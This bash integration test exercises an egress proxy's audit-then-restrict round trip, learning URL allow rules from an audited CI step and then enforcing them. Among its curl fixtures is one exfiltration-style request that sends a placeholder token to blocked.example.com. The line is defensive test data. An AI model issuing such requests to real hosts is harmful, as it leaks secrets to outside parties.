#!/bin/bash
# The audit-then-restrict round trip, which is what the inspect engine is
# for -- ported from buildcage/docker's test/run-inspect-roundtrip.sh.
#
# Phase 1 runs a `run:` step under `audit` and extracts the `allowed_url_rules`
# the report generated from what it saw. Phase 2 runs again under `restrict`
# with exactly those rules -- and nothing else -- via
# test/inspect-roundtrip-scenarios.sh, repeating every request phase 1 made
# plus a few it never made.
#
# Both halves matter. Rules that break the run they were learned from make the
# workflow useless; rules that permit everything make it pointless.
#
# Phase 1 also sets ALLOW_TLS_RULES, so the audit run has a real TLS
# passthrough to record. allow_tls_rules/allowed_ip_rules are echoed into the
# same fenced report block as allowed_url_rules (see
# src/core/lib/report/render/inspect-example.ts) rather than derived from
# traffic, and phase 2 clears ALLOW_TLS_RULES on purpose so the URL rules have
# to stand alone -- a prior bug here let the allow_tls_rules line leak into
# the extracted allowed_url_rules text instead and break phase 2 outright.
set -uo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
FAILURES=0

: "${BUILDCAGE_LOCAL_IMAGE_REF:?BUILDCAGE_LOCAL_IMAGE_REF must be set to a locally built inspect-engine image (BUILDCAGE_TEST_HOOKS=1 PROXY_ENGINE=inspect docker compose build proxy)}"

pass() { echo "  PASS  $1"; }
fail() {
  echo "  FAIL  $1"
  FAILURES=$((FAILURES + 1))
}

echo ""
echo "=== Inspect Engine Integration Test (audit -> restrict round trip) ==="
echo ""

echo "--- bringing up fixture origins (compose.test-inspect.yaml) ---"
cleanup() {
  docker compose -f "$REPO_ROOT/compose.test-inspect.yaml" down -v >/dev/null 2>&1 || true
}
trap cleanup EXIT
docker compose -f "$REPO_ROOT/compose.test-inspect.yaml" up -d --build --wait

TMPDIR=$(mktemp -d)
touch "$TMPDIR/state.env"

echo ""
echo "=== Phase 1: learn the rules from an audit run ==="

AUDIT_SUMMARY="$TMPDIR/audit-summary.md"
touch "$AUDIT_SUMMARY"

GITHUB_WORKSPACE="$TMPDIR" \
GITHUB_STATE="$TMPDIR/state.env" \
GITHUB_STEP_SUMMARY="$AUDIT_SUMMARY" \
BUILDCAGE_RUN_DEBUG_SUMMARY_FILE="$AUDIT_SUMMARY" \
BUILDCAGE_LOCAL_IMAGE_REF="$BUILDCAGE_LOCAL_IMAGE_REF" \
BUILDCAGE_TEST_COMPOSE_FILE="$REPO_ROOT/docker/compose.action.test-inspect.yaml" \
BUILDCAGE_TEST_CERT_PATH="$REPO_ROOT/test/test-server-inspect/cert.pem" \
EXTERNAL_RESOLVER="10.200.0.53" \
INPUT_PROXY_ENGINE="inspect" \
INPUT_PROXY_MODE="audit" \
INPUT_ALLOW_TLS_RULES="tlspass.example.com:443" \
INPUT_RUN="
S='curl -sS --max-time 10'
\$S https://allowed.example.com/public/pkg.tgz
\$S https://allowed.example.com/public/a/one.tgz
\$S https://allowed.example.com/public/b/two.tgz
\$S -X POST https://api.example.com/v1/thing
\$S http://allowed.example.com:9080/public/pkg.tgz
\$S https://allowed.example.com:9443/private/secret
\$S \"https://blocked.example.com/exfil?token=SECRET-VALUE\"
\$S --insecure https://tlspass.example.com/public/x
true" \
  node "$REPO_ROOT/dist/main.cjs" >"$TMPDIR/audit-out.log" 2>&1
AUDIT_EXIT=$?
cat "$TMPDIR/audit-out.log"

echo ""
echo "--- audit-phase exit code: $AUDIT_EXIT ---"
if [ "$AUDIT_EXIT" = "0" ]; then
  pass "audit mode enforced nothing, so the step succeeded"
else
  fail "the audit-phase step failed (should never refuse anything)"
fi

SUMMARY=$(cat "$AUDIT_SUMMARY")

echo ""
echo "[report] allow_tls_rules is echoed as configured, not derived from traffic:"
if grep -qF "allow_tls_rules: |" <<< "$SUMMARY" && grep -qF "tlspass.example.com:443" <<< "$SUMMARY"; then
  pass "allow_tls_rules appears in the restrict-mode example"
else
  fail "allow_tls_rules is missing from the restrict-mode example"
fi

RULES=$(
  # Stops at the next top-level key (allow_tls_rules/allowed_ip_rules are
  # echoed into the same fenced block, see inspect-example.ts) as well as the
  # closing fence, so only the allowed_url_rules value is captured -- see
  # buildcage/docker's test/run-inspect-roundtrip.sh for the same fix.
  awk '
    /allowed_url_rules: \|/ { capture=1; next }
    capture && /^ *(allow_tls_rules|allowed_ip_rules): \|/ { exit }
    capture && /```/ { exit }
    capture { print }
  ' <<< "$SUMMARY" | sed 's/^ *//'
)

if [ -z "$RULES" ]; then
  fail "the audit report generated no allowed_url_rules"
else
  pass "the audit report generated allowed_url_rules"
fi

echo ""
echo "Rules generated from the audit run:"
sed 's/^/    /' <<< "$RULES"

echo ""
echo "=== Phase 2: enforce them, unedited ==="

RESTRICT_SUMMARY="$TMPDIR/restrict-summary.md"
touch "$RESTRICT_SUMMARY"

GITHUB_WORKSPACE="$TMPDIR" \
GITHUB_STATE="$TMPDIR/state.env" \
GITHUB_STEP_SUMMARY="$RESTRICT_SUMMARY" \
BUILDCAGE_RUN_DEBUG_SUMMARY_FILE="$RESTRICT_SUMMARY" \
BUILDCAGE_LOCAL_IMAGE_REF="$BUILDCAGE_LOCAL_IMAGE_REF" \
BUILDCAGE_TEST_COMPOSE_FILE="$REPO_ROOT/docker/compose.action.test-inspect.yaml" \
BUILDCAGE_TEST_CERT_PATH="$REPO_ROOT/test/test-server-inspect/cert.pem" \
EXTERNAL_RESOLVER="10.200.0.53" \
INPUT_PROXY_ENGINE="inspect" \
INPUT_PROXY_MODE="restrict" \
INPUT_ALLOWED_URL_RULES="$RULES" \
INPUT_ALLOW_TLS_RULES="" \
INPUT_FAIL_ON_BLOCKED="false" \
INPUT_RUN="bash $REPO_ROOT/test/inspect-roundtrip-scenarios.sh" \
  node "$REPO_ROOT/dist/main.cjs" >"$TMPDIR/restrict-out.log" 2>&1
RESTRICT_EXIT=$?
cat "$TMPDIR/restrict-out.log"

echo ""
echo "--- restrict-phase exit code: $RESTRICT_EXIT ---"
if [ "$RESTRICT_EXIT" = "0" ]; then
  pass "the generated rules permit everything the audit run did, and refuse what it never did"
else
  fail "one or more round-trip scenarios failed (see log above)"
fi

rm -rf "$TMPDIR"

echo ""
if [ "$FAILURES" -gt 0 ]; then
  echo "❌ FAILED: $FAILURES assertion(s) failed"
  exit 1
fi
echo "✅ All assertions passed."
echo ""
